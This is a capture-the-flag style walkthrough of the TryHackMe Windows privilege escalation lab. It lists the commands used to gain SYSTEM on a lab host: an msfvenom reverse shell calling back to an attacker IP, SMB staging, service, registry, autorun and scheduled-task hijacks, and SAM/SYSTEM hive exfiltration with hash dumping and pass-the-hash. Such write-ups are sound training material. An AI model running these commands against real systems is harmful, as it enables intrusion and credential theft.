# Walkthrough : TryHackMe - Windows Privilege
Target IP: ```10.49.181.254```
Attacker IP: ```192.168.135.130```
Initial Access User: ```user (WIN-QBA94KB3IOF\user)```
Elevated Access: ```NT AUTHORITY\SYSTEM```

## Phase 1: Reconnaissance & Initial Access
1. Network Port Scanning
- Command Executed:
```bash
nmap -sV -sC -p- 10.49.181.254
```
- Key Findings:
  - Port 135/tcp & 445/tcp: MS-RPC & SMB (Windows Server 2019 Standard Evaluation 17763)
  - Port 3389/tcp: Microsoft Terminal Services (RDP) on host ```WIN-QBA94KB3IOF```
  - Ports 5985/tcp & 47001/tcp: WinRM / HTTPAPI 2.0
  - Ports 49664-49670/tcp: High RPC dynamic ports

2. RDP Initial Access
- Command Executed:
```bash
xfreerdp /u:user /p:password321 /cert:ignore /v:10.49.181.254
```
- Outcome: Successfully established interactive GUI session as ```user```.

## Phase 2: Staging Payload & SMB Share Transfer
1. Generate Reverse Shell Payload (Attacker Host)
- Command Executed:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.135.130 LPORT=9000 -f exe -o reverse.exe
```
2. Host Local SMB Server & Transfer Payload (Target Host)
- Attacker Host (Impacket SMB Server):
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -debug -smb2support -username test -password test kali .
```
- Target RDP Session (Command Prompt):
```bash
net use \\192.168.135.130\kali /user:test test
copy \\192.168.135.130\kali\reverse.exe C:\PrivEsc\reverse.exe
```
3. 3. Initial Low-Privilege Shell Verification
- Attacker Host Listener:
```bash
nc -lvnp 9000
```
- Target Execution:
```bash
C:\PrivEsc\reverse.exe
```
- Outcome: Received unprivileged reverse shell as ```win-qba94kb3iof\user```.

## Phase 3: Privilege Escalation - Service Weak Sub-Permissions (DACLs)
1. Query Target Service Configuration
- Command Executed:
```bash
sc qc daclsvc
```
- Findings: ```daclsvc``` runs as ```LocalSystem```, but low-privilege users have modification rights over the service configuration.

2. Reconfigure Binary Path & Trigger Service
- Command Executed:
```bash
sc config daclsvc binpath= "C:\PrivEsc\reverse.exe"
net start daclsvc
```
- Outcome: Netcat listener on port 9000 caught an elevated reverse shell.
- Privilege Verification:
```bash
C:\Windows\system32> whoami
nt authority\system
```
## Phase 4: Privilege Escalation - Unquoted Service Path
1. Identify Vulnerable Service Configuration
- Command Executed:
```bash
sc qc unquotedsvc
```
- Findings:
  - Binary Path: ```C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe```
  - Vulnerability: Unquoted space-separated path, allowing Windows to attempt execution of ```C:\Program Files\Unquoted Path Service\Common.exe``` first.

2. Check Directory Write Permissions & Hijack Binary Path
- Command Executed:
```bash
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```
- Findings: ```BUILTIN\Users``` group has ```RW``` (Read/Write) access to the directory.

3. Plant Payload & Trigger Service
- Command Executed:
```bash
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
net start unquotedsvc
```
## Phase 5: Privilege Escalation - Insecure Registry Permissions

1. Query Service Configuration & Check Registry Permissions
- Command Executed:
```bash
sc qc regsvc
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```
- Findings:
  - Service Name: regsvc (runs as LocalSystem).
  - Vulnerability: The registry key HKLM\System\CurrentControlSet\Services\regsvc grants KEY_ALL_ACCESS permissions to NT AUTHORITY\INTERACTIVE, allowing low-privileged users to modify registry entries for the service.

2. Modify Service Registry ImagePath & Trigger Service
- Command Executed:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
net start regsvc
```
3. Privileged Shell Verification
- Attacker Host Listener:
```bash
nc -lvnp 9000
```
- Outcome: Caught elevated reverse shell.
- Privilege Verification:
```bash
C:\Windows\system32> whoami
nt authority\system
```
## Phase 6: Privilege Escalation - Weak File Permissions
1. Query Service & Verify Executable File Permissions
- Command Executed:
```bash
sc qc filepermsvc
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```
- Findings:
  - Service Name: filepermsvc (runs as ```LocalSystem```).
  - Vulnerability: The executable file ```filepermservice.exe``` grants ```FILE_ALL_ACCESS``` permissions to ```Everyone``` and ```BUILTIN\Users```.

2. Overwrite Executable & Trigger Service
- Command Executed:
```bash
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
net start filepermsvc
```
3. Privileged Shell Verification
- Attacker Host Listener:
```bash
nc -lvnp 9000
```
- Outcome: Caught elevated reverse shell ```(nt authority\system)```.

## Phase 7: Privilege Escalation - Registry Autoruns
1. Query Autorun Registry Key & Inspect Binary Permissions
- Command Executed:
```bash
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```
- Findings:
  - Registry Value: ```My Program``` pointing to ```"C:\Program Files\Autorun Program\program.exe"```.
  - Vulnerability: The target binary has ```FILE_ALL_ACCESS``` for Everyone and ```BUILTIN\Users```.

2. Overwrite Target Binary & Trigger Execution via RDP Session Logon
- Command Executed:
```bash
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```
- Trigger Mechanism: Authenticated via RDP as administrator (```admin / password123```) or triggered a system reboot/logon event.
- Command Executed (Attacker Host RDP Connection):
```bash
xfreerdp /u:admin /p:password123 /cert:ignore /v:10.49.181.254
```
3. User Shell Verification
- Attacker Host Listener:
```bash
nc -lvnp 9000
```
- Outcome: Received shell upon user logon.
- Privilege Verification:
```bash
C:\Windows\system32> whoami
win-qba94kb3iof\admin
```
## Phase 8: Credential Harvesting - Registry Mining

1. Query Registry for Stored Credentials
- Command Executed:
```bash
reg query HKCU /f password123 /t REG_SZ /s
```
- Findings:
  - Registry Key: ```HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42```
  - Discovered Credentials: ```ProxyPassword = password123```

2. Pass-the-Credential Execution (winexe)
- Command Executed:
```bash
winexe -U 'admin%password123' //10.49.181.254 cmd.exe
```
- Outcome: Established an interactive administrative shell (```win-qba94kb3iof\admin```).

## Phase 9: Privilege Escalation - Saved Windows Credentials (cmdkey)
1. Enumerate Stored Windows Credentials
- Command Executed:
```bash
cmdkey /list
```
- Findings:
  - Target: ```Domain:interactive=WIN-QBA94KB3IOF\admin```
  - User: ```WIN-QBA94KB3IOF\admin```

2. Execute Payload using Saved Credentials
- Command Executed:
```bash
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```
- Outcome: The Netcat listener on port 9000 caught an administrative shell (win-qba94kb3iof\admin).

## Phase 10: Credential Harvesting - SAM & SYSTEM Dump
1. Copy SAM and SYSTEM Registry Hive Backups
- Target Commands Executed:
```bash
copy C:\Windows\Repair\SAM \\192.168.135.130\kali
copy C:\Windows\Repair\SYSTEM \\192.168.135.130\kali
```
2. Extract NTLM Hashes using Impacket
- Attacker Host Command:
```bash
sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
- Extracted Admin NTLM Hash: ```a9fdfa038c4b75ebc76dc855dd74f0da```

3. Pass-the-Hash Access (wmiexec)
- Command Executed:
```bash
/usr/bin/impacket-wmiexec admin@10.49.181.254 -hashes aad3b435b1404eeaad3b435b1404ee:a9fdfa038c4b75ebc76dc855dd74f0da
```
- Outcome: Semi-interactive administrative shell achieved (```win-qba94kb3iof\admin```).

## Phase 11: Privilege Escalation - Scheduled Tasks
1. Inspect Target Script & Check Write Permissions
- Command Executed:
```bash
type C:\DevTools\CleanUp.ps1
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```
- Findings:
  - File Purpose: Script runs regularly as ```SYSTEM``` to clean logs.
  - Vulnerability: user has full write access (```RW, FILE_WRITE_DATA, FILE_APPEND_DATA```) to ```CleanUp.ps1```.

2. Inject Payload into Scheduled Task Script
- Command Executed:
```bash
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```
- Outcome: Triggered via scheduled interval; netcat listener caught elevated reverse shell (```nt authority\system```).

## Phase 12: Privilege Escalation - GUI Application Escapes

1. Identify Elevated GUI Application
- Command Executed:
```bash
tasklist /V | findstr mspaint.exe
```
- Findings: ```mspaint.exe``` running under process ID ```3068``` as ```WIN-QBA94KB3IOF\admin```.

2. Escape to Command Prompt via File Open Dialog
- Action Sequence:
    1. Open MS Paint File Open Dialog (```File -> Open```).
    2. In the navigation bar, input: ```file://c:/windows/system32/cmd.exe``` and hit Enter.
- Outcome: Spawned interactive Command Prompt running with elevated privileges (```win-qba94kb3iof\admin```).

## Phase 13: Privilege Inspection - Token Privileges (whoami /priv)
- Command Executed:
```bash
whoami /priv
```
Key Administrative Privileges Confirmed:
  - ```SeBackupPrivilege / SeRestorePrivilege```: Allows reading/writing any file on the system regardless of ACLs.
  - ```SeDebugPrivilege```: Allows process memory injection and dumping LSASS.
  - ```SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege```: Enables token impersonation attacks (e.g., Potato exploits like SweetPotato/RoguePotato).
